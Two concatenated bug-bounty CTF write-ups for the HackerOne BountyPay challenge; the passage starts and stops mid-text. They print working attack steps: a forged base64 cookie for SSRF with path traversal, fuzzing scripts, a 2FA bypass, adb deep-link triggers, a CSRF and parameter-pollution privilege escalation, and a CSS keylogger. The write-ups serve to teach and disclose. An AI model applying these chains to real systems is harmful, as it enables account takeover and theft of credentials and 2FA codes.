In the configuration file, there was the URL of the repository:
{F859755}
Once you enter the [Git repository on GitHub](https://github.com/bounty-pay-code/request-logger.git) you'll find a `logger.php` file with the following code:
{F859757}

I began to think about injection attacks, but it soon became irrelevant since I saw that the payload is being base64 encoded before saved to the log file and therefore I thought - maybe this log file exists in app.bountypay.h1ctf.com? The answer was yes.

## Finding Credentials

In the log file I was able to find base64 encoded strings:
```bash
$ curl https://app.bountypay.h1ctf.com/bp_web_trace.log
1588931909:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJHRVQiLCJQQVJBTVMiOnsiR0VUIjpbXSwiUE9TVCI6W119fQ==
1588931919:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIn19fQ==
1588931928:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIiwiY2hhbGxlbmdlX2Fuc3dlciI6ImJEODNKazI3ZFEifX19
1588931945:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC9zdGF0ZW1lbnRzIiwiTUVUSE9EIjoiR0VUIiwiUEFSQU1TIjp7IkdFVCI6eyJtb250aCI6IjA0IiwieWVhciI6IjIwMjAifSwiUE9TVCI6W119fQ==
```

To make it easier to work with, I used the following Bash 1-liner which prints only the base64 **decoded** payload:
```bash
$ curl -s https://app.bountypay.h1ctf.com/bp_web_trace.log | awk -F ':' '{print $2}' | while read line; do echo "$line" | base64 --decode && echo "\n"; done
{"IP":"192.168.1.1","URI":"\/","METHOD":"GET","PARAMS":{"GET":[],"POST":[]}}

{"IP":"192.168.1.1","URI":"\/","METHOD":"POST","PARAMS":{"GET":[],"POST":{"username":"brian.oliver","password":"V7h0inzX"}}}

{"IP":"192.168.1.1","URI":"\/","METHOD":"POST","PARAMS":{"GET":[],"POST":{"username":"brian.oliver","password":"V7h0inzX","challenge_answer":"bD83Jk27dQ"}}}

{"IP":"192.168.1.1","URI":"\/statements","METHOD":"GET","PARAMS":{"GET":{"month":"04","year":"2020"},"POST":[]}}
```

The next step was to actually try and log in with the exposed username and password `{"username":"brian.oliver","password":"V7h0inzX"}`, but it required me to do a 2-factor-authentication.

## 2FA Bypass

Due to the complexity of the code (10 characters, a-zA-Z0-9) I understood that brute-force isn't an option and I then had a look in the request in order to find a bypass.
These are the POST parameters from the request:
`username=brian.oliver&password=V7h0inzX&challenge=59e3c72d15b17b1b3cbd1c6ab0dc45ab&challenge_answer=My2faCode`
Looks like we need to find the `challenge_answer`, but wait.. What is `challenge`? That looks like an md5 hash.
1. Can we crack it? (nope.. that didn't work)
1. Can we understand what is `challenge` and why we need it in addition to `challenge_answer`?
The answer was that the application is checking if `md5(challenge_answer) equals challenge`, therefore I just placed `test` in challenge_answer  and `098f6bcd4621d373cade4e832627b4f6` in the challenge value and resubmitted the request and got a cookie!
{F859768}

## Finding the next door (SSRF via "Load Transactions" functionality)
Now that I was logged in as Brian I saw the BountyPay Dashboard with no transactions. Clicking the "Load Transactions" button triggered a request to `/statements?month=05&year=2020` and returned the following response body:
```
{"url":"https:\/\/api.bountypay.h1ctf.com\/api\/accounts\/F8gHiqSdpK\/statements?month=05&year=2020","data":"{\"description\":\"Transactions for 2020-05\",\"transactions\":[]}"}
```

If we will take a closer look at the cookie we received after we logged in (`eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9`), we will notice that this is a base64 encoded string, and this is how it looks after decode:
`{"account_id":"F8gHiqSdpK","hash":"de235bffd23df6995ad4e0930baac1a2"}`

Hmm, interesting. The account_id exist both here in the encoded cookie and in the response from the load transactions request. What if we'll change our account_id to `../../` - that worked and the response contained our path traversal in the returned URL `"url":"https:\/\/api.bountypay.h1ctf.com\/api\/accounts\/..\/..\/F8gHiqSdpK\/statements?month=05&year=2020"`.
The question was how we can use it as an SSRF on other subdomains and on which?
During the recon phase I also found out two more things that now come handy:
  1. https://software.bountypay.h1ctf.com/ returns a 401 Unauthorized error
  1. In https://api.bountypay.h1ctf.com/ there is a link to Google with an explanation on what is REST API, but the link isn't referring directly to Google, but to an internal `/redirect` endpoint (which have some kind of URLs whitelist)

By combining those two clues, I decided to enumerate files/directories in the software subdomain and was able to achieve it by chaining the SSRF vulnerability with the (semi-)open-redirect.
This is how the cookie value looks like `{"account_id":"../../redirect?url=https://software.bountypay.h1ctf.com","hash":"de235bffd23df6995ad4e0930baac1a2"}`.
In order to do the enumeration, I did the following flow:
  1. I created a simple Bash script that gets a url and generates the base64 encoded cookie value. {F859785}
  1. I created the payloads list and used ffuf for the enumeration:

```bash
cat ./SecLists/Discovery/Web-Content/common.txt | while read line; do ./soft-urls.sh "https://software.bountypay.h1ctf.com/${line}?"; done > fuzz-urls-encoded.txt

ffuf -w fuzz-urls-encoded.txt -u "https://app.bountypay.h1ctf.com/statements/?month=04&year=2020" -H "Cookie: token=FUZZ" -fw 5
```
 
One of the responses contained the following data which tells us that directory listing is enabled in `/uploads/` and that there is an APK file there.
```
<html>\n<head><title>Index of \/uploads\/<\/title><\/head>\n<body bgcolor=\"white\">\n<h1>Index of \/uploads\/<\/h1><hr><pre><a href=\"..\/\">..\/<\/a>\n<a href=\"\/uploads\/BountyPay.apk\">BountyPay.apk<\/a>                                        20-Apr-2020 11:26              4043701\n<\/pre><hr><\/body>\n<\/html>\n"}
```

I was then able to download the file from https://software.bountypay.h1ctf.com/uploads/BountyPay.apk.

## Android Application Reverse-Engineering Challenge
I started by installing the application on a local [Android Studio](https://developer.android.com/studio) emulator.

```bash
# Install an apk from the CLI
adb install BountyPay.apk
```
Then once I clicked the money bag button at the bottom of the app I saw the following notification:
{F860987}
Deep links? Hmm, okay! **Let's open up the code.**

In order to start reverse-engineering the application, I used multiple tools and techniques which will now be explained.
I used [Apktool](https://ibotpeaches.github.io/Apktool/) to unpack the APK file. Once the APK is unpacked we can investigate things like the manifest file and look for hard-coded strings.

After  I searched for hard-coded strings like URLs, tokens, and API keys without success, I moved on to investigating the deep-links.
This is how the deep-links definition looks like in the BountyPay app:

```java
        <activity android:label="@string/title_activity_congrats" android:name="bounty.pay.CongratsActivity" android:theme="@style/AppTheme.NoActionBar"/>
        <activity android:label="@string/title_activity_part_three" android:name="bounty.pay.PartThreeActivity" android:theme="@style/AppTheme.NoActionBar">
            <intent-filter android:label="">
                <action android:name="android.intent.action.VIEW"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="android.intent.category.BROWSABLE"/>
                <data android:host="part" android:scheme="three"/>
            </intent-filter>
        </activity>
        <activity android:label="@string/title_activity_part_two" android:name="bounty.pay.PartTwoActivity" android:theme="@style/AppTheme.NoActionBar">
            <intent-filter android:label="">
                <action android:name="android.intent.action.VIEW"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="android.intent.category.BROWSABLE"/>
                <data android:host="part" android:scheme="two"/>
            </intent-filter>
        </activity>
        <activity android:label="@string/title_activity_part_one" android:name="bounty.pay.PartOneActivity" android:theme="@style/AppTheme.NoActionBar">
            <intent-filter android:label="">
                <action android:name="android.intent.action.VIEW"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="android.intent.category.BROWSABLE"/>
                <data android:host="part" android:scheme="one"/>
            </intent-filter>
        </activity>
```

In short, we have three deep-link types:

```
one://part
two://part
three://part
```

Now its time to review to code and see what is on the other side of the deep links, which functionality they trigger.
I used [dex2jar](https://github.com/pxb1988/dex2jar) and [jd-gui](https://github.com/java-decompiler/jd-gui) to decompile the code and view it as java files.
The first deep link's functionality is placed at `PartOneActivity.java` and this is the relevant piece of code that reveals the full structure of the expected deep link:

```java
    if (getIntent() != null && getIntent().getData() != null) {
      String str = getIntent().getData().getQueryParameter("start");
      if (str != null && str.equals("PartTwoActivity") && sharedPreferences.contains("USERNAME")) {
        str = sharedPreferences.getString("USERNAME", "");
        SharedPreferences.Editor editor = sharedPreferences.edit();
        String str1 = sharedPreferences.getString("TWITTERHANDLE", "");
        editor.putString("PARTONE", "COMPLETE").apply();
        logFlagFound(str, str1);
        startActivity(new Intent((Context)this, PartTwoActivity.class));
      } 
    } 
```

**To trigger the first deep link I used `adb` from the CLI:**

```bash
adb shell am start -W -a android.intent.action.VIEW -d "one://part?start=PartTwoActivity" bounty.pay
```

The next mobile application challenges were pretty much the same but required some more advanced reverse engineering effort. I'll cover it briefly since it is pretty messy to write all the bits and bytes.

**Triggering the second deep link:**

```java
    if (getIntent() != null && getIntent().getData() != null) {
      Uri uri = getIntent().getData();
      String str1 = uri.getQueryParameter("two");
      String str2 = uri.getQueryParameter("switch");
      if (str1 != null && str1.equals("light") && str2 != null && str2.equals("on")) {
        editText.setVisibility(0);
        button.setVisibility(0);
        textView.setVisibility(0);
      } 
    } 
```

Trigger with `adb`:

```bash
adb shell am start -W -a android.intent.action.VIEW -d "two://part?two=light\&switch=on" bounty.pay
```

Now we get another screen with a text box and a hash below it.
{F861020}

We have two ways to crack it:
**Reverse engineer to understand the expected value**
  
  ```java
    public void submitInfo(View paramView) {
    final String post = ((EditText)findViewById(2131230834)).getText().toString();
    this.childRef.addListenerForSingleValueEvent(new ValueEventListener() {
          public void onCancelled(DatabaseError param1DatabaseError) {
            Log.e("PartTwoActivity", "onCancelled", (Throwable)param1DatabaseError.toException());
          }
          
          public void onDataChange(DataSnapshot param1DataSnapshot) {
            tring str1 = (String)param1DataSnapshot.getValue();
            SharedPreferences sharedPreferences = PartTwoActivity.this.getSharedPreferences("user_created", 0);
            SharedPreferences.Editor editor = sharedPreferences.edit();
            String str2 = post;
            StringBuilder stringBuilder = new StringBuilder();
            stringBuilder.append("X-");
            stringBuilder.append(str1);
            if (str2.equals(stringBuilder.toString())) {
              str1 = sharedPreferences.getString("USERNAME", "");
              String str = sharedPreferences.getString("TWITTERHANDLE", "");
              PartTwoActivity.this.logFlagFound(str1, str);
              editor.putString("PARTTWO", "COMPLETE").apply();
              PartTwoActivity.this.correctHeader();
              return;
            } 
            Toast.makeText((Context)PartTwoActivity.this, "Try again! :D", 0).show();
          }
        });
  }
  ```
(This code piece is the main area, but to actually crack it you need other code pieces)

**The easy way - try to hack that md5 hash and get the expected value**
You will then enter`X-Token` in the text box and proceed to the third screen.

**Third screen**
In the third screen's code, there are code parts for Firebase connection, authentication, HTTP request and there are also a few log lines (`Log.i..`).
I started `logcat` on my machine so I'll be able to see the logs and triggered the last deep link that I've figured out from the code:

```bash
adb shell am start -W -a android.intent.action.VIEW -d "three://part?switch=b24\&three=UGFydFRocmVlQWN0aXZpdHk%3D\&header=X-Token" bounty.pay
```

💥💥💥💥💥💥💥 BOOM 💥💥💥💥💥💥💥
I now got a URL, a header, and a token to continue with.
{F861053}

## Privilege Escalation and Gaining a Staff User
I started enumerating files and directories once again in api.bountypay.h1ctf.com, but this time with the token and I found a new path - `https://api.bountypay.h1ctf.com/api/staff`(you may find the command I used in the references section at the bottom).

This path returns the staff members which is interesting, but I want more than that. I need to pay the hackers! I need to log in as a staff member.
That made me think about how can I create a staff user for myself. Hmm, what about trying to do a POST request with my own staff details.

I copied the staff member structure from the GET request, adjusted it to be sent as a x-www-form-urlencoded data and tried to send it with Brian's details:
```
name=Brian%20Oliver&staff_id=STF:KE624RQ2T9
```

That returned the following error:

```
HTTP/1.1 400 Bad Request
Server: nginx/1.14.0 (Ubuntu)
Date: Tue, 09 Jun 2020 18:29:09 GMT
Content-Type: application/json
Connection: close
Content-Length: 21

["Missing Parameter"]
```

I got stuck on that for a long time until I realized that I'm not sending the `Content-Type: application/x-www-form-urlencoded` header! Once I've added the header I got the following error: "Staff Member already has an account".

I played with the parameters a bit more, but that didn't work. I returned back to what I already know and got remembered of  [BountyPayHQ's Twitter](https://twitter.com/BountypayHQ) (BTW - BE AWARE OF FAKES! - https://twitter.com/BountypayH - WTF?@#%*$).
I didn't mention it, but I've found it at a very early stage of the CTF inside the HTML of the main domain.

{F861092}

There is obviously a clue here..
I had two questions - who is Sandra and who are they following?

I've found out that [Sandra](https://twitter.com/SandraA76708114) is a new employee, which is so excited about her new job that she took a picture of herself with her employee's badge:
{F861105}

Let's grab her staff_id and register with it. That worked and I got the following response:

```json
{"description":"Staff Member Account Created","username":"sandra.allison","password":"s%3D8qB8zEpMnc*xsz7Yp5"}
```

Now let's explore the staff web application and escalate further.

## Chaining CSRF + Content Injection(?) + Parameter Pollution to Privilege Escalation
I have to admit that this was **the best part of the challenge in my opinion**. I scratched my head here until I found the attack vector, but even then, it was complicated to actually perform the full exploitation.
This is a neat attack vector that combines multiple vulnerabilities and functionalities.

I'll go over the basic things I have discovered by testing the staff application and after that, I will connect the dots.
{F861113}
  - There are support tickets page and a specific ticket page, but nothing seems to be vulnerable to injections and there is no way to even place a message
  - We can edit the profile name and profile avatar
  - We can't inject bad things (SQLi, XSS, HTML, SSTI) in the profile name and the avatar, all special characters are removed, e.g. {}<>`"
  - The avatar's value is not being validated and is being printed to the DOM as a class. In a normal state, the `avatar` class, for example, will cause a specific background image to appear.
  {F861121}
  What we **can do** is to inject our own classes, but that's meaningless, right?
  - There is a report to admin functionality that sends a relative URL (in base64) to the admin for them to investigate a page. I couldn't find any SSRF vulnerabilities or other injections.
   {F861136}
  - The page is using a custom JavaScript file - `/js/website.js` with the following content

**Examine the JS File**
```javascript
$('.upgradeToAdmin').click(function () {
  let t = $('input[name="username"]').val();
  $.get('/admin/upgrade?username=' + t, function () {
    alert('User Upgraded to Admin')
  })
}),
$('.tab').click(function () {
  return $('.tab').removeClass('active'),
  $(this).addClass('active'),
  $('div.content').addClass('hidden'),
  $('div.content-' + $(this).attr('data-target')).removeClass('hidden'),
  !1
}),
$('.sendReport').click(function () {
  $.get('/admin/report?url=' + url, function () {
    alert('Report sent to admin team')
  }),
  $('#myModal').modal('hide')
}),
document.location.hash.length > 0 && ('#tab1' === document.location.hash && $('.tab1').trigger('click'), '#tab2' === document.location.hash && $('.tab2').trigger('click'), '#tab3' === document.location.hash && $('.tab3').trigger('click'), '#tab4' === document.location.hash && $('.tab4').trigger('click'));
``` 

The first thing that pops is the admin upgrade request `$.get('/admin/upgrade?username=' + t`.
I tried to open it in my browser, but it returned an error that only admins can perform the upgrade. I also tried to use the X-Token that we found in the mobile application, but that didn't work as well.
I also tried some other things like sending it with Sandra's username in the report to admin, but nope... Nothing happened.
So, we definitely have a CSRF issue that can work with some social engineering attack, but that's not the case here. We need a **fully working exploitation**!

Let's **continue investigating the JS file and draw an attack vector**.
We can see that the upgrade to admin request is triggered by a click on an element with the class `upgradeToAdmin`.
Does that ring a bell? We can control the classes of the avatar!

Now once I click my avatar a request is being triggered:
{F861144}

But, we still have two problems that we need to solve:
  1. Clicking my profile picture is great, but not feasible in a CTF - we need to make it trigger the request automatically
  1. The request needs a username, but the username is taken from `input[name="username"]` which doesn't exist on any of the pages, except for the login page, but on the login page we don't have this JS file :S

Let's take it to step by step...
**Make the request trigger automatically on page load**
Let's focus on the following JS code:

```javascript
document.location.hash.length > 0 && ('#tab1' === document.location.hash && $('.tab1').trigger('click'), '#tab2' === document.location.hash && $('.tab2').trigger('click'), '#tab3' === document.location.hash && $('.tab3').trigger('click'), '#tab4' === document.location.hash && $('.tab4').trigger('click'));
```

When the location hash contains #tab[1-4], that triggers a click on the equivalent class, for example, when I open https://staff.bountypay.h1ctf.com/?template=home#tab3 it will trigger a click on all elements with the class `tab3`. This was made so a user will be able to open a specific tab directly by a given URL. A pretty common use case actually.

Do I have to remind you that **we can control the classes of the profile picture**?
I then updated my profile_avatar with the following value - `avatar2 upgradeToAdmin tab2` and once I entered https://staff.bountypay.h1ctf.com/?template=home#tab2 that triggered the `/admin/upgrade` request automatically.

**Passing the username in the request**
I tried to submit the URL https://staff.bountypay.h1ctf.com/?template=home#tab2 in different variations for a while, hoping that when the admin will see Sandra's ticket, for example, they will have an input with Sandra's username in the page and that it will work, but it didn't.
I also tried to pass `&username=sandra.allison` in the URL and other things as well without any success.

Let's once again take a step back and think of what we already know.
We know that the only place where we have a username field is the login page, but how can I make it appear here as well?

By taking another look in the URL we can see that it has a template parameter. Actually, I even tested it for LFI at the very beginning...
The URL: https://staff.bountypay.h1ctf.com/?template=home

What if we could load more than one template?? I tried to use parameter pollution like that:
`https://staff.bountypay.h1ctf.com/?template=home&template=login`
But that didn't work. I then thought to give it another try and do it like that:
`https://staff.bountypay.h1ctf.com/?template[]=home&template[]=login`

That worked!
{F861172}

Another minor thing, we also need to place the `&username=sandra.allison` in the URL so it will be placed in the username field when loading the template.

**Putting it all together**
  - Make sure we placed the classes (`upgradeToAdmin tab2`) in our profile_avatar
  - Write our final payload:
  `/?template[]=login&template[]=ticket&ticket_id=3582&username=sandra.allison#tab2`
  - Make a report request with the base64 encoded payload:  
  `GET /admin/report?url=Lz90ZW1wbGF0ZVtdPWxvZ2luJnRlbXBsYXRlW109dGlja2V0JnRpY2tldF9pZD0zNTgyJnVzZXJuYW1lPXNhbmRyYS5hbGxpc29uI3RhYjI= HTTP/1.1`

We got a new cookie!
{F861179}

With the new cookie, Sandra is now an admin and we have a new tab in our staff application:
{F861181}

## Another 2FA Bypass via SSRF and CSS Keylogger
Once we log in as marten.mickos (we will have to bypass the same old 2FA as we did with Brian at the beginning), we will be able to finally see the transaction that we need to pay:
{F861194}

Once we click the Pay button we will get another 2FA verification:
{F861205}
And once we'll click the send challenge button the following request will be made:

```
POST /pay/17538771/27cd1393c170e1e97f9507a5351ea1ba HTTP/1.1
Host: app.bountypay.h1ctf.com
...

app_style=https%3A%2F%2Fwww.bountypay.h1ctf.com%2Fcss%2Funi_2fa_style.css
```

Interesting, right?
Let's see what's inside the CSS file.

```css
/**
Template for the UNI 2FA App
 */

body {
    background-color: #FFFFFF;
}

div.branding {
    height:80px;
    width:80px;
    margin:20px auto 40px auto;
    background-image:url("https://www.bountypay.h1ctf.com/images/bountypay.png");
    background-position:center center;
    background-repeat: no-repeat;
    background-size: cover;
}
```

"Template for the UNI 2FA App"? App what? App who?

I checked if this is actually vulnerable to SSRF and the answer was **yes**. I got the requests on my Burp Collaborator from Headless Chrome.
I played with that a bit and got to conculsion that the response from my server is not reflected any where and therefore we have a **blind SSRF**.

Let's go by the book. When trying to exploit a blind SSRF there are two main things we can do:
  - Port Scanning - couldn't find open ports (by response size and response time)
  - Gopher protocol - didn't even try it, no chance that this will be the final step in the CTF

It was 2am and I decided to take a nap until my children will wake me up again in ~4 hours.
At the next morning, when drinking my coffee, I had a crazy idea... I was thinking "well, this CSS is being used in the 2FA client app, why won't we try a CSS keylogger, even if it won't work - it's always cool to use it!"

I placed a CSS keylogger on my server and sent the code once again with the `app_style` parameter pointing to my CSS keylogger.
{F861238}

It worked! I got requests with the characters.
I tried to enter the characters in the same order it arrived, but that didn't work. That makes sense, because the victim's browser makes the requests almost in parallel and therefore the order isn't correct.
I started to create a list of all the ppossibilities from the given characters in order to brute-force it, but then I had a much better idea.

That leads me to **the final keylogger**:
I understood that the application contains multiple inputs and each one contains one character. All I need to do is to get the characters in the right order. Can I do it in CSS? Sure I can!
I used the `nth-child(x)` selector and appended `-[child-number]` to the logged character.

This is how it appeared on my server:
{F861287}

I was then able to complete the challenge and get the flag.

Hope you enjoyed reading my write-up! If so, click the up arrow at the top :D
Feel free to follow me on Twitter as well :)

## Supporting Material/References
  - More about Android deep-links - https://developer.android.com/training/app-links/deep-linking
  - Fuzzing the API subdomain with the X-Token 
  ```bash
  ffuf -u "https://api.bountypay.h1ctf.com/api/FUZZ" -H "X-Token: 8e9998ee3137ca9ade8f372739f062c1" -w ./SecLists/Discovery/Web- 
  Content/common.txt.
  ```
  - The final CSS Keylogger I used - {F861290}

## Impact

There are a few critical impacts besides the technical ones:
- The main impact is that I didn't sleep enough since you released the CTF
- Positive impact due to new things I learned
- Positive impact on the Hackers community that will read this and other write-ups on the challenge
- I'm returning to my programs with more motivation which will do good for the world and for HackerOne's revenue 😂

---

### [[H1-2006 2020] How I solved my first H1 CTF](https://hackerone.com/reports/895587)

- **Report ID:** `895587`
- **Severity:** Critical
- **Weakness:** Violation of Secure Design Principles
- **Program:** h1-ctf
- **Reporter:** @cr33pb0y
- **Bounty:** - usd
- **Disclosed:** 2020-06-18T16:10:41.665Z
- **CVE(s):** -

**Vulnerability Information:**

## Introduction:

Hello! My name is @cr33pbp0y and I going to tell you how I resolved my first HackerOne CTF. 

## Prelude 

One day, I was reading some tweets about some new vulnerabilities and new hunters adquisitions when the Great H tweeted:

{F861267}

I thought: "WoW, a new virtual event!! It could be awesome to assist to!!!". And then, I replied the tweet:

{F861275}

My heart started to beat quickly and my mind was ready to the next (and hard...) battle, so the CTF began.

## Steps To Reproduce:

The CTF started with the wildcard: **X.bountypay.h1ctf.com**, so, when you have a new domain to investigate you should to call some of the hunter friends: Amass, Subl1ster and Aquatone!

{F861288}

With some domains discovered, I saw its faces for first time:

### bountypay.h1ctf.com
The first page of the CTF. It use? It takes you to Staff or App...
{F861294}

### api.bountypay.h1ctf.com
A nice page with a elegant message and a redirection link....suspicious....¬.¬
{F861297}

### app.bountypay.h1ctf.com
One of the important pages of all CTF (you know why later...)
{F861299}

### staff.bountypay.h1ctf.com
The second important page of the CRF
{F861301}

### software.bountypay.h1ctf.com
The little shy page...

{F861307}

So, with this material the show started!

## Enumeration:

I used **dirsearch** and **ffuf** to enumerate the findings, and some in *app.bountypay.h1ctf.com* caught my attention:

{F861313}

A **.git** resource with some file...interesting....

So the first one had the big price: if you clicked to a Github URL: https://app.bountypay.h1ctf.com/.git/config a config file showed up:

{F861319}

And with the url a file. And file inside a code with a PHP code, showing that it existed a log file living in the app page!!!

{F861320}
{F861322}

So, searching the file I found it on APP page:

{F861330}

Code was base64 encoding, so decoding it, it shows like this:

```
{"IP":"192.168.1.1","URI":"\/","METHOD":"GET","PARAMS":{"GET":[],"POST":[]}}$##"c"%U$#%"$UDB#%5B"%$2#$tUB#%5B#'W6W&R#&'&ƗfW""'77v&B#%cv祂'{"IP":"192.168.1.1","URI":"\/","METHOD":"POST","PARAMS":{"GET":[],"POST":{"username":"brian.oliver","password":"V7h0inzX","challenge_answer":"bD83Jk27dQ"}}}{"IP":"192.168.1.1","URI":"\/statements","METHOD":"GET","PARAMS":{"GET":{"month":"04","year":"2020"},"POST":[]}}
```

It showed in cleartext a username, its password and a strange challenge_answer, so I thought to logged in to app page. 

## Deeping into app.bountypay.h1ctf.com

Using the username and password disclosed in the log file, app page requested you a 2FA....maybe challenge_answer could help...

{F861347}

I tried introducing first a fake value and I realized that challenge was MD5 hash-encoded it:

{F861348}

So, using the leaked code and hashing to MD5 I was able to log in:

{F861354}
{F861353}

My internal voice: "OK! We are in! and now what?! Well...there is a button...Can I press it? Nothing...Wait! Nothing? Tamperit"

And yes, if you tamper the request, it will show the next request and the next response:

{F861367}
{F861368}

Response shows **api.bountypay.h1ctf.com**, so there was a chance to change to other page: COOL!

But, how? Digging into web app, I realized that cookie was Base64 encoded: 

```{"account_id":"F8gHiqSdpK","hash":"de235bffd23df6995ad4e0930baac1a2"}```

"Ok....and now what" I thought, firstly. But, two minutes (or two hours, I don't remember very well...) later, I saw that **F8gHiqSdpK** code was reflected to the response...."What it happen if I change the cookie?"

So I was trying with some parameters and I realized there was an SSRF!!!

"But, what could I do with a SSRF?" my internal voice said again, thinking for me....

"Maybe, there could be some interesting software piece inside **software.bountypay.h1ctf.com** and for sure **api.bountypay.h1ctf.com** it's authorized to go there!!!"

So, I forged a new cookie, following the next steps:

* First, adding a hash to the finish of the account_id parameter, to comment parameters to the right of # character:

 ```{"account_id":"F8gHiqSdpK#","hash":"de235bffd23df6995ad4e0930baac1a2"}```

* Second, adding a path traversal payload to go to root part of the URL:
```{"account_id":"F8gHiqSdpK../../../../../#","hash":"de235bffd23df6995ad4e0930baac1a2"}```

* Finally, adding */redirect?url=* parameters and software URL...
```{"account_id":"F8gHiqSdpK../../../../../redirect?url=software.bountypay.h1ctf.com/#","hash":"de235bffd23df6995ad4e0930baac1a2"}```

Ok, let's try! All Base64 encoded again and let's see:

{F861395}

Nice, but it was just a username/password form...How could I recon that page?

I was thinking and thinkng, and thinking...when an idea appeared in my head:"If I create a dict with the payload and then base64 encode the code again...."

And then, I wrote a piece of script Python: something like this:

```
#!/usr/bin/env python3

from itertools import combinations 
import requests
import base64

SECLIST_FILE = './dicc.txt' ## file path

with open(SECLIST_FILE,'r') as f:
  for word in f.readlines():
    value = str.encode('{"account_id":"../../../../../redirect?url=https://software.bountypay.h1ctf.com/' + word.rstrip("\n") + '#","hash":"de235bffd23df6995ad4e0930baac1a2"}')
    token_value = base64.b64encode(value).decode('utf-8')
    response = requests.get('https://app.bountypay.h1ctf.com/statements?month=01&year=2020', cookies={'token':token_value})
    if not "Not Found" in str(response.content, word):
      print(response.content)
```
Short history long: like Burp Suite intruder but in Python. 

The code generates payloads with the values obtained from SECLIST_FILE file and request it with the cookie encoded to base64.

 It the response was not "Not Found", then the code printed the response. 

My code responsed with *uploads*:

{F861418}

And an APK file showed it up!

Going to https://software.bountypay.h1ctf.com/uploads/BountyPay.apk, I got the APk file.

## APK BOUNTY PAY: the funniest part of the show!

To this part, I just used MobSF and ADB (and my androin phone, of course).

I installed the APK file in my phone and I just saw this screen after login in:

{F862372}

Just a button that get you some hints and no more...

Taking a look to the source code using MobSF you can see that challenges was divided in three parts.

### PartOneActivity.java :

Deeping into source code, one snipet caught my attention:

{F862379}

That said my that, if you pass some parameters to APK activity, you will go to part two!!

Ok!! So, using this ADB command (and reading this awesome report https://hackerone.com/reports/328486, thanks @bagipro) 

``` adb shell am start -n bounty.pay/bounty.pay.PartOneActivity -a android.intent.action.SEND -d "one://?start=PartTwoActivity"```

I  passed to the next level.

### PartTwoActivity.java

The second screen seemed like first one, but with other hints( Current Invisible and Visible with the right params).

{F862384}

So, it seemed that, once again, I needed pass other parameters to this new one activity.

I came back to the source code again and I saw this code:

{F862386}

Like PartOne, if you passed the right parameters with the following command:

```adb shell am start -n bounty.pay/bounty.pay.PartTwoActivity -a android.intent.action.VIEW -d "two://?two=light\&switch=on" ```

The part two faced up:

{F862392}

Ok, there was a code, MD5 hash. Crackstation is always your friend, so, if you inserted this on that page, the hash reverse hash code said something like: "Token". But introducing that code with submit button didn't do anything.

As you can see two images above, in the end of the code, it shows that user must introduce "X-" prefix to access to part three.

So, introducing "X-Token" you could go to next level: Part Three

{F862411}

### PartTwoActivity.java

Once in the final round of the APK challenge, I saw the same like other ones, but with other hints (Reuse params and Intercept or check for leaks):

{F862421}

So, as I learnt on the other challenges, I came back again throug source code:

{F862427}

Reading again, if you sent the old params to APK with other values, you could see the activity interface, using the following code:

``` adb shell am start -n bounty.pay/bounty.pay.PartThreeActivity -a android.intent.action.VIEW -d "three://?three=UGFydFRocmVlQWN0aXZpdHk=\&switch=b24=\&header=X-Token"```

{F862432}

Hints said my that it was a token or something into the code, so submitting that code I would win.


I got into the phone and, searching for a file, I found this one:

{F862447}

So, using that code and submitting again I finished the APK challenge:
{F862452}
{F862454}

But a new one started!

## API and STAFF part

The final tips from APK Challenges were that I had something to do in API webpage, but what?

Well, doing some recon, I found a */api/staff/* request, that let you know that some header or token was missing:

{F862539}

So, with the APK token leaked, api got me some info about staff members:

{F862543}

Cool the requests showed the name and the staff_id of Staff Members, but the info wasn't enought to log in on staff part...

After thinking a lot, I thought on one of the picture that H1 tweeted on the CTF account .

{F862550}

Cool, another staff_id again, but I needed a password or something..."Could I request a password with staff_id? " I though...

And yes, I could,

Doing a POST over the above request and using **staff_id** as parameter, I could obtain Sandra's password ^_^

{F862555}

Thanks Sandra, I've got your password!!!

Using this credentials I could log in to staff portal.

In my opinion, it was the hardest part of the challenge!!!

When you land into the page, you see a Dashboard where the action you can do are upload Sandra's profile:

{F862569}

And see one "Welcome ticket from admin":

{F862574}

Further, user could report pages to admin if it saw something wrong....

So after thinking, asking and almost dying, I got the solution.

There was a **website.js** file that  contains the following code:

```
$(".upgradeToAdmin").click(function(){let t=$('input[name="username"]').val();$.get("/admin/upgrade?username="+t,function(){alert("User Upgraded to Admin")})}),$(".tab").click(function(){return $(".tab").removeClass("active"),$(this).addClass("active"),$("div.content").addClass("hidden"),$("div.content-"+$(this).attr("data-target")).removeClass("hidden"),!1}),$(".sendReport").click(function(){$.get("/admin/report?url="+url,function(){alert("Report sent to admin team")}),$("#myModal").modal("hide")}),document.location.hash.length>0&&("#tab1"===document.location.hash&&$(".tab1").trigger("click"),"#tab2"===document.location.hash&&$(".tab2").trigger("click"),"#tab3"===document.location.hash&&$(".tab3").trigger("click"),"#tab4"===document.location.hash&&$(".tab4").trigger("click"));
```

Furthermore, profile upload let user to upload both profile name and avatar. The avatar div had a class name #avatar(1|2|3) too and this last parameter was vulnerable to injection, so, changing the avatar in the request previous tampering and adding **upgradeToAdmin** and **tab4** class...so doing this:

{F862615}

I had this functionallity, but I need to be admin to be admin... So I needed to report something wrong...but what?

And after many smoke over my head, I thought on HTTP Parameter Pollution.

Doing the following request:

https://staff.bountypay.h1ctf.com/?template[]=login&username=sandra.allison&template[]=ticket&ticket_id=3582#tab4

{F862622}

I broke the page.

{F862640}

Finally, I had to base64-encode this payload and send it to one admin, doing the following request:

{F862656}

